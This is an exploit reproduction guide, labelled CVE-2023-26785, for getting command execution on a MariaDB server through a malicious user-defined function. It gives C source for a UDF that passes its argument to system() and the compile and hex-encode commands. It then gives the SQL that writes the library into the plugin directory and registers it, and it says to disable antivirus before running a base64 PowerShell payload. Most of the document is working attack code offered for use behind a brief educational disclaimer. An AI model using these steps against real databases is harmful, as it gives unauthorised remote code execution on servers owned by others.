# CVE-2023-26785


---

# Exploit Reproduction Guide (MariaDB 10.5)

This guide provides step-by-step instructions to reproduce a User-Defined Function (UDF) attack on a database system. Please note that this exploit may work on some systems, but it might not function correctly on 64-bit architectures or certain builds.

> **Warning:** This is for educational purposes only. Unauthorized use of these techniques is illegal and unethical.

## Steps to Reproduce the Attack

### 1. Download and Prepare the UDF Code

First, create a file named `exploit.c` and add the following code:

```c
#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
    unsigned int        arg_count;   // number of arguments
    enum Item_result    *arg_type;   // pointer to item_result
    char                **args;      // pointer to arguments
    unsigned long       *lengths;    // length of string args
    char                *maybe_null; // 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
    char                maybe_null;  // 1 if func can return NULL
    unsigned int        decimals;    // for real functions
    unsigned long       max_length;  // for string functions
    char                *ptr;        // free ptr for func data
    char                const_item;  // 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
    if (args->arg_count != 1)
        return(0);

    system(args->args[0]);

    return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
    return(0);
}
```

### 2. Compile the UDF Code

Compile the exploit code using the `x86_64-w64-mingw32-gcc` compiler:

```bash
x86_64-w64-mingw32-gcc -g -c exploit.c
```

### 3. Create a Shared Object File

Generate a shared object file (`exploit.so`) from the compiled object file:

```bash
x86_64-w64-mingw32-gcc -g -shared -Wl,-soname,exploit.so -o exploit.so exploit.o
```

### 4. Convert the Shared Object File to Hexadecimal

Use `xxd` to convert the `.so` file to a hexadecimal format:

```bash
xxd -p exploit.so | tr -d '\n' > hex_value.txt
```

### 5. Load the Hexadecimal Value into the Database

Copy the hexadecimal value from `hex_value.txt` and execute the following command in your database:

```sql
DB> set @shell = 0x<hex_value>;
```

### 6. Determine the Plugin Directory and Deploy the Exploit

Find the plugin directory by running:

```sql
DB> select @@plugin_dir;
```

Then, create the exploit shared object in the plugin directory:

```sql
DB> select binary @shell into dumpfile 'C:\\Program Files\\MariaDB 10.4\\lib\\plugin\\exploit.so';
```

> **Note:** Adjust the path according to your system's configuration or the specific plugin directory.

### 7. Create the Malicious Function

Create a new function in the database using the exploit:

```sql
DB> create function do_system returns integer soname 'exploit.so';
```

### 8. Execute the Exploit

Disable any antivirus or Windows Defender that might block the exploit. Then, run a command using the newly created function:

```sql
DB> select do_system('powershell base64 here');
```

Replace `'powershell base64 here'` with the base64 encoded payload of the command you wish to execute.

---

**Disclaimer:** This document is intended for educational purposes and security research only. Misuse of this information can result in criminal charges and severe legal penalties. Always obtain permission from the relevant authorities before testing any vulnerabilities on a network or system.
